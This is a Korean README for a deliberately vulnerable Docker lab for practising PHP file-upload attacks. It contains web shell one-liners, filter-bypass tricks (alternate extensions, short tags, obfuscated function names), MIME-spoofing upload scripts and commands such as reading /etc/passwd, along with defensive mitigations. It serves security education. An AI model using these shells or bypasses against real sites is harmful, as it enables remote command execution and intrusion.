# 🎯 웹셸 실습 환경 (Web Shell Practice)

> ⚠️ **경고**: 이 프로젝트는 **교육 목적 전용**입니다. 실제 운영 환경에서는 절대 사용하지 마세요!

## 📋 개요

웹 보안 취약점, 특히 파일 업로드 취약점과 웹셸 공격을 학습하기 위한 실습 환경입니다.
Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.

## 🔧 구성 요소

- **웹 서버**: Nginx
- **애플리케이션**: PHP 8.1 + PHP-FPM
- **컨테이너**: Docker + Docker Compose
- **프로세스 관리**: Supervisor

## 🚀 시작하기

### 필수 요구사항

- Docker
- Docker Compose

### 설치 및 실행

1. **Docker 컨테이너 빌드 및 실행**
   ```bash
   docker-compose up -d --build
   ```

2. **브라우저에서 접속**
   ```
   http://localhost:8080
   ```

3. **컨테이너 중지**
   ```bash
   docker-compose down
   ```

4. **로그 확인**
   ```bash
   docker-compose logs -f
   ```

## 🎓 실습 시나리오

이 환경은 3단계 난이도로 구성되어 있으며, 각 레벨마다 다른 보안 검증이 적용됩니다.

### Level 1 - 초급 (필터링 없음)

**목표**: 기본적인 웹셸 업로드 및 실행

1. **웹셸 준비**
   ```bash
   cp www/sample-webshell.php.txt webshell.php
   ```

2. **업로드**
   - `http://localhost:8080` 접속
   - Level 1 선택
   - webshell.php 업로드

3. **실행**
   ```
   http://localhost:8080/uploads/webshell.php?cmd=ls
   http://localhost:8080/uploads/webshell.php?cmd=whoami
   ```

### Level 2 - 중급 (기본 필터링)

**적용된 보안 검증**:
- ❌ `.php` 확장자 차단 (소문자만)
- ❌ 위험 함수 키워드 차단: `system`, `exec`, `shell_exec`, `eval`, `passthru`

**우회 방법**:

1. **확장자 우회 - .phtml 사용**
   ```bash
   # 샘플 파일 사용
   cp www/bypass-samples/level2-phtml.phtml.txt shell.phtml

   # 또는 직접 작성
   echo '<?php echo `{$_GET["cmd"]}`; ?>' > shell.phtml
   ```

2. **확장자 우회 - .php5 사용**
   ```bash
   cp www/bypass-samples/level2-php5.php5.txt shell.php5
   ```

3. **함수명 우회 - 대소문자 혼용**
   ```php
   <?php sYsTeM($_GET['cmd']); ?>
   ```

4. **함수명 우회 - 백틱 연산자**
   ```php
   <?php echo `{$_GET['cmd']}`; ?>
   ```

### Level 3 - 고급 (강화된 필터링)

**적용된 보안 검증**:
- ❌ 파일 크기 10KB 제한
- ❌ `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
- ❌ MIME 타입 검증 (이미지/PDF/텍스트만)
- ❌ `<?php` 태그 검증
- ❌ 더 많은 위험 함수 차단 (대소문자 모두)

**우회 방법**:

1. **기본 우회 파일 준비**
   ```bash
   cp www/bypass-samples/level3-short-tag.phtml.txt shell.phtml
   ```

2. **MIME 타입 조작이 필요**

   **방법 1: Burp Suite 사용**
   - Burp Proxy 실행 및 브라우저 프록시 설정
   - 파일 업로드 시 요청 가로채기
   - `Content-Type: application/octet-stream`을
     `Content-Type: image/png` 또는 `text/plain`으로 변경
   - Forward

   **방법 2: curl 명령**
   ```bash
   curl -X POST \
     -F "level=3" \
     -F "file=@shell.phtml;type=image/png" \
     http://localhost:8080/upload.php
   ```

   **방법 3: Python 스크립트**
   ```python
   import requests

   files = {
       'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/png')
   }
   data = {'level': '3'}

   response = requests.post('http://localhost:8080/upload.php',
                           files=files, data=data)
   print(response.text)
   ```

3. **업로드 성공 후 실행**
   ```
   http://localhost:8080/uploads/shell.phtml?cmd=ls
   ```

## 🔓 레벨별 취약점 및 우회 기법

### Level 1 - 초급
**취약점**:
- 모든 파일 확장자 허용
- 파일 내용 검증 없음
- 어떤 PHP 파일도 업로드 및 실행 가능

**학습 목표**:
- 기본적인 웹셸 개념 이해
- 파일 업로드 공격의 기초 학습

### Level 2 - 중급
**적용된 검증 (취약)**:
1. `.php` 확장자만 차단 (소문자)
2. `system`, `exec`, `shell_exec`, `eval`, `passthru` 키워드 차단

**취약점**:
- ✅ `.phtml`, `.php5`, `.php3` 등 다른 PHP 확장자 허용
- ✅ 대소문자 구분으로 `sYsTeM` 등 우회 가능
- ✅ 백틱(`) 연산자는 차단하지 않음
- ✅ `pcntl_exec`, `proc_open` 등 다른 함수 미차단

**우회 기법**:
1. 확장자 변경: `.php` → `.phtml`, `.php5`
2. 대소문자 혼용: `system` → `sYsTeM`
3. 백틱 사용: `` `whoami` ``
4. 다른 함수 사용: `pcntl_exec()`, `proc_open()`

### Level 3 - 고급
**적용된 검증 (취약)**:
1. `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
2. MIME 타입 검증 (이미지/PDF/텍스트만)
3. `<?php` 태그 검증
4. 더 많은 위험 함수 차단 (대소문자 모두)
5. 파일 크기 10KB 제한

**취약점**:
- ✅ `.phtml`, `.php5` 등은 여전히 허용
- ✅ 짧은 PHP 태그 `<?` 는 미차단
- ✅ MIME 타입은 클라이언트에서 조작 가능
- ✅ 백틱 연산자 미차단
- ✅ `pcntl_exec`, `assert` 등 일부 함수 미차단

**우회 기법**:
1. `.phtml` 또는 `.php5` 확장자 사용
2. 짧은 PHP 태그 `<?` 사용
3. MIME 타입 조작 (Burp Suite, curl, Python)
4. 백틱 연산자로 명령 실행
5. 파일 크기를 10KB 이하로 유지

## 🛠️ 추가 우회 기법 모음

### 1. 확장자 우회
```
.phtml   - PHP HTML
.php5    - PHP 5.x
.php3    - PHP 3.x
.php4    - PHP 4.x
.inc     - Include 파일 (설정에 따라)
.phps    - PHP Source (설정에 따라)
```

### 2. 함수 실행 우회
```php
// 백틱 연산자
echo `whoami`;

// 대소문자 혼용
sYsTeM('ls');

// 문자열 연결
$a = 'sys'; $b = 'tem';
$func = $a.$b;
$func('ls');

// 변수 함수
$f = 'system';
$f('ls');

// assert (PHP < 7.2)
assert($_GET['cmd']);

// create_function (PHP < 7.2)
$f = create_function('', $_GET['cmd']);
$f();
```

### 3. PHP 태그 우회
```php
<?php ... ?>   // 표준 태그
<? ... ?>      // 짧은 태그
<?= ... ?>     // 출력 태그 (짧은 태그)
<% ... %>      // ASP 스타일 (asp_tags 설정 필요)
```

### 4. MIME 타입 조작
```bash
# Burp Suite: Content-Type 변경
# curl 사용
curl -F "file=@shell.php;type=image/png"

# Python requests
files = {'file': ('shell.php', open('shell.php', 'rb'), 'image/png')}
```

## 🛡️ 보안 대책 (학습용)

실제 환경에서는 다음과 같은 대책을 적용해야 합니다:

### 1. 파일 확장자 화이트리스트
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$file_extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array(strtolower($file_extension), $allowed_extensions)) {
    die('허용되지 않는 파일 형식입니다.');
}
```

### 2. 파일 내용 검증
```php
// 이미지 파일인 경우
$image_info = getimagesize($_FILES['file']['tmp_name']);
if ($image_info === false) {
    die('유효한 이미지 파일이 아닙니다.');
}
```

### 3. 파일명 무작위화
```php
$new_filename = uniqid() . '.' . $file_extension;
```

### 4. 업로드 디렉토리 실행 권한 제거
```nginx
# nginx 설정
location ~* ^/uploads/.*\.(php|php3|php4|php5|phtml)$ {
    deny all;
}
```

### 5. 파일 저장 위치 변경
- 웹 루트 외부에 파일 저장
- 별도의 파일 서버 사용

## 📁 프로젝트 구조

```
.
├── docker-compose.yml      # Docker Compose 설정
├── Dockerfile              # Docker 이미지 빌드 설정
├── nginx.conf              # Nginx 웹서버 설정
├── supervisord.conf        # 프로세스 관리 설정
├── www/                    # 웹 애플리케이션 디렉토리
│   ├── index.php           # 메인 페이지
│   ├── upload.php          # 파일 업로드 처리
│   ├── sample-webshell.php.txt  # 샘플 웹셸
│   └── uploads/            # 업로드된 파일 저장 디렉토리
└── README.md               # 이 파일
```

## 🧪 테스트 명령어 예제

웹셸 실행 후 사용할 수 있는 명령어들:

```bash
# 현재 디렉토리 확인
?cmd=pwd

# 파일 목록 보기
?cmd=ls -la

# 현재 사용자 확인
?cmd=whoami

# 시스템 정보
?cmd=uname -a

# 파일 내용 보기
?cmd=cat /etc/passwd

# 네트워크 정보
?cmd=ifconfig
```

## ⚠️ 주의사항

1. **교육 목적으로만 사용하세요**
   - 허가받지 않은 시스템에 대한 공격은 불법입니다
   - 본인이 소유하거나 테스트 권한이 있는 시스템에서만 실습하세요

2. **실제 운영 환경에서 사용 금지**
   - 이 코드는 의도적으로 취약하게 만들어졌습니다
   - 실제 서비스에 적용하면 심각한 보안 사고가 발생할 수 있습니다

3. **네트워크 노출 주의**
   - 로컬 환경에서만 실습하세요
   - 공개 네트워크에 노출하지 마세요

## 📚 학습 자료

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Shell 공격 기법](https://www.acunetix.com/websitesecurity/upload-forms-threat/)

## 🤝 기여

이 프로젝트는 교육 목적으로 만들어졌습니다. 개선 사항이나 추가 학습 시나리오에 대한 제안을 환영합니다.

## 📄 라이선스

교육 목적으로 자유롭게 사용 가능합니다. 단, 악의적인 목적으로 사용하는 것은 금지됩니다.

---

**면책 조항**: 이 프로젝트는 보안 교육 및 연구 목적으로만 제공됩니다. 작성자는 이 코드의 오용으로 인한 어떠한 손해에 대해서도 책임지지 않습니다.
